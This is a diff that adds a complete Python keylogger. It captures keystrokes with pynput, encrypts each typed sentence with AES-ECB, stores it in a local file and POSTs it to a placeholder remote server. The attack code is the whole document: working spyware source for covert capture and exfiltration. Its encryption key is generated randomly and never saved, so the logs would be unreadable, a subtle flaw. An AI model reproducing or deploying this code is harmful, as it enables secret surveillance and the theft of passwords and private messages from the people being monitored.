@@ -1,0 +1,83 @@
+import os
+import base64
+import requests
+import threading
+import time
+from pynput.keyboard import Key, Listener
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+
+# Configuration
+CONFIG = {
+    'REMOTE_URL': 'http://your-remote-server.com/log',
+    'ENCRYPTION_KEY': get_random_bytes(16),
+    'LOG_FILE': 'keylog.enc',
+    'MAX_LOG_SIZE': 10 * 1024 * 1024,  # 10 MB
+}
+
+sentence = []
+
+# AES Encryption
+def pad(data):
+    padding = AES.block_size - len(data) % AES.block_size
+    return data + chr(padding) * padding
+
+def unpad(data):
+    return data[:-ord(data[-1])]
+
+def encrypt(data, key):
+    cipher = AES.new(key, AES.MODE_ECB)
+    encrypted_data = cipher.encrypt(pad(data).encode())
+    return base64.b64encode(encrypted_data).decode()
+
+# Log Management
+def write_log(log):
+    with open(CONFIG['LOG_FILE'], 'a') as f:
+        f.write(log + '\n')
+    if os.path.getsize(CONFIG['LOG_FILE']) > CONFIG['MAX_LOG_SIZE']:
+        os.rename(CONFIG['LOG_FILE'], CONFIG['LOG_FILE'] + ".1")
+
+# Send log to server
+def send_log(log):
+    try:
+        response = requests.post(CONFIG['REMOTE_URL'], json={'log': log}, headers={'Content-Type': 'application/json'})
+        if response.status_code == 200:
+            print("Log sent successfully")
+    except requests.RequestException:
+        print("Failed to send log")
+
+# Keystroke Capture
+def on_press(key):
+    global sentence
+    try:
+        if hasattr(key, 'char') and key.char and key.char.isprintable():
+            sentence.append(key.char)
+        elif key == Key.space:
+            sentence.append(' ')
+        elif key == Key.enter:
+            process_sentence()
+    except Exception:
+        sentence.append(f"[{key}]")
+
+def process_sentence():
+    global sentence
+    if sentence:
+        log = encrypt(''.join(sentence), CONFIG['ENCRYPTION_KEY'])
+        write_log(log)
+        send_log(log)
+        sentence = []
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+# Start Keylogger
+def start_keylogger():
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+# Main
+if __name__ == "__main__":
+    threading.Thread(target=start_keylogger, daemon=True).start()
+    while True:
+        time.sleep(60)
